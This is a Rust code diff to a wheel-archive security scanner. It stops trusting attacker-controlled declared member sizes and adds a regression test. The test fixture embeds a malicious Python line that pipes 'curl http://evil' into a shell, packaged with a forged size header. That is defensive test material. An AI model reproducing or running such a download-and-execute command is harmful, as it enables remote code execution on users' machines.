@@ -321,10 +321,6 @@ struct MemberMeta {
     encrypted: bool,
     /// The compression method as stored.
     compression: zip::CompressionMethod,
-    /// The declared (attacker-controlled, NOT trusted as a budget) uncompressed
-    /// size, used only as a hint for native-member buffering decisions before we
-    /// know the real streamed size.
-    declared_size: u64,
 }
 
 /// Inspect a wheel (or generic zip) from a `Read + Seek` handle, streaming each
@@ -426,7 +422,6 @@ pub fn read_wheel<R: Read + Seek>(
             is_symlink: file.is_symlink(),
             encrypted: file.encrypted(),
             compression: file.compression(),
-            declared_size: file.size(),
         });
     }
 
@@ -517,25 +512,15 @@ pub fn read_wheel<R: Read + Seek>(
         // `NativeTruncated` gap noting the deep parse was truncated. The streaming
         // view is bounded by `remaining_total`, and the bytes it reads are debited,
         // so an oversized native member cannot bypass the total budget either.
-        // A NON-native member whose DECLARED size exceeds the per-member cap needs no
-        // deep parse, so skip decompression and record the gap. A NATIVE member is
-        // deliberately NOT routed on the attacker-controlled `declared_size` (the field
-        // doc warns it is "attacker-controlled, NOT trusted"): an inflated declared size
-        // would otherwise downgrade a SMALL module to the shallow streaming view and evade
-        // B7's deep parser. Native members fall through to `stream_member`, which routes on
-        // the REAL streamed bytes - it Buffers a module that actually fits and streams
-        // (with a NativeTruncated gap, in stream_member's too-large arm) only one whose
-        // real bytes exceed the cap.
-        if meta.declared_size > limits.max_member_uncompressed
-            && classify_member(&member_label) != ArtifactFileKind::NativeModule
-        {
-            inspection.coverage.gaps.push(CoverageGap {
-                location,
-                kind: CoverageGapKind::MemberTooLarge,
-                sha256: None,
-            });
-            continue;
-        }
+        // NO declared-size pre-check: `declared_size` is attacker-controlled (the field doc
+        // warns it is "NOT trusted"), so routing on it lets an inflated size skip a SMALL
+        // member's analysis entirely - a native module would evade B7's deep parser, and a
+        // non-native member (Python source, WHEEL, RECORD) would never be read at all while
+        // the wheel is still Accepted. EVERY member therefore falls through to
+        // `stream_member`, which routes on the REAL streamed bytes and enforces the per-member
+        // cap there: a member that actually fits is analyzed, and only one whose real bytes
+        // exceed the cap returns BudgetExceeded/MemberTooLarge (the same gap that the
+        // declared-size shortcut used to record, but now decided on actual bytes).
 
         // Total-uncompressed budget reached: stop decompressing further members.
         if total_budget_hit {
@@ -1689,7 +1674,6 @@ mod tests {
             is_symlink: false,
             encrypted: false,
             compression: CompressionMethod::Deflated,
-            declared_size: 0,
         }
     }
 
@@ -2110,6 +2094,45 @@ mod tests {
                 .iter()
                 .any(|g| g.kind == CoverageGapKind::CompressionRatioExceeded),
             "an inflated central-dir compressed_size must not disable the ratio guard; gaps: {:?}",
+            inspection.coverage.gaps
+        );
+    }
+
+    #[test]
+    fn inflated_declared_size_does_not_skip_a_small_non_native_member() {
+        // A NON-native member (Python source) with a SMALL real size but an INFLATED declared
+        // size must still be READ - the declared size is attacker-controlled, so routing on it
+        // would let malicious code ride in behind a lying header (skipped as a MemberTooLarge
+        // gap while the wheel is still Accepted). The member's real bytes fit, so there is no
+        // MemberTooLarge gap.
+        let body = b"import os; os.system('curl http://evil | sh')\n";
+        let mut bytes = ZipBuilder::new().file("pkg/evil.py", body).build();
+        set_central_dir_uncompressed_size(&mut bytes, 150 * 1024); // lie: declare 150 KiB
+        let sha = sha256_hex(&bytes);
+        let limits = ArchiveLimits {
+            max_member_uncompressed: 128 * 1024, // 128 KiB: real (~46 B) FITS; declared 150 KiB lies over
+            ..ArchiveLimits::default()
+        };
+        struct NoopVisitor;
+        impl MemberVisitor for NoopVisitor {}
+        let outcome = read_wheel(
+            Cursor::new(bytes),
+            "demo-1.0-py3-none-any.whl",
+            &sha,
+            &limits,
+            &mut NoopVisitor,
+        );
+        let inspection = match &outcome {
+            ArchiveOutcome::Accepted(i) => i,
+            other => panic!("a small member must Accept, got {other:?}"),
+        };
+        assert!(
+            !inspection
+                .coverage
+                .gaps
+                .iter()
+                .any(|g| g.kind == CoverageGapKind::MemberTooLarge),
+            "a small non-native member must NOT be skipped on an inflated declared size: {:?}",
             inspection.coverage.gaps
         );
     }
